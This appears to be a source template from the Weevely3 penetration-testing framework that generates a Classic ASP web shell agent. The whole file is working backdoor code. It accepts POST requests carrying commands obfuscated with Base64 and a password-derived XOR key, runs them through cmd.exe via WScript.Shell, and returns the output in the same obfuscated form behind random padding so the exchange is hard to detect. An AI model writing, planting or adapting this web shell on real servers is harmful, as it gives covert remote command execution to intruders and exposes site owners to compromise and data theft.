<%! import hashlib, weevely, string %>
<%
passwordhash = hashlib.md5(password.encode('utf-8')).hexdigest().lower()
key = passwordhash[:8]
header = passwordhash[8:20]
footer = passwordhash[20:32]
PREPEND = weevely.utils.strings.randstr(16, charset = string.digits + string.ascii_letters).decode('utf-8')
%>
<%text><%</%text>
Option Explicit
On Error Resume Next

' Weevely3 Classic ASP Agent
' Implements XOR -> Base64 protocol (No GZIP due to VBScript limitations)

Function XorStr(text, key)
    Dim i, klen, res, c
    klen = Len(key)
    res = ""
    For i = 1 To Len(text)
        c = Asc(Mid(text, i, 1)) Xor Asc(Mid(key, ((i - 1) Mod klen) + 1, 1))
        res = res & Chr(c)
    Next
    XorStr = res
End Function

Function Base64Decode(s)
    Dim xml, node
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.CreateElement("b64")
    node.DataType = "bin.base64"
    node.Text = s
    Base64Decode = Stream_BinaryToString(node.NodeTypedValue)
    Set node = Nothing
    Set xml = Nothing
End Function

Function Base64Encode(s)
    Dim xml, node
    Set xml = CreateObject("MSXML2.DOMDocument")
    Set node = xml.CreateElement("b64")
    node.DataType = "bin.base64"
    node.NodeTypedValue = Stream_StringToBinary(s)
    Base64Encode = node.Text
    Set node = Nothing
    Set xml = Nothing
End Function

Function Stream_StringToBinary(Text)
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = 2 'adTypeText
  BinaryStream.CharSet = "iso-8859-1"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = 1 'adTypeBinary
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function

Function Stream_BinaryToString(Binary)
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = 1 'adTypeBinary
  BinaryStream.Open
  BinaryStream.Write Binary
  BinaryStream.Position = 0
  BinaryStream.Type = 2 'adTypeText
  BinaryStream.CharSet = "iso-8859-1"
  Stream_BinaryToString = BinaryStream.ReadText
  Set BinaryStream = Nothing
End Function

Function ExecuteCmd(cmd)
    Dim shell, exec, output
    Set shell = Server.CreateObject("WScript.Shell")
    Set exec = shell.Exec("cmd.exe /c " & cmd)
    output = exec.StdOut.ReadAll() & exec.StdErr.ReadAll()
    ExecuteCmd = output
    Set exec = Nothing
    Set shell = Nothing
End Function

Dim k, kh, kf, p, content, start, finish, payload, decoded, unxorred, output, reXorred, encoded

k = "${key}"
kh = "${header}"
kf = "${footer}"
p = "${PREPEND}"

If Request.ServerVariables("REQUEST_METHOD") = "POST" Then
    content = Request.BinaryRead(Request.TotalBytes)
    content = Stream_BinaryToString(content)
    
    start = InStr(content, kh)
    finish = InStr(content, kf)
    
    If start > 0 And finish > 0 Then
        payload = Mid(content, start + Len(kh), finish - (start + Len(kh)))
        
        ' Decode: Base64 -> XOR
        decoded = Base64Decode(payload)
        unxorred = XorStr(decoded, k)
        
        ' Execute
        output = ExecuteCmd(unxorred)
        
        ' Encode: XOR -> Base64
        reXorred = XorStr(output, k)
        encoded = Base64Encode(reXorred)
        
        Response.Write p & kh & encoded & kf
    End If
End If
<%text>%></%text>
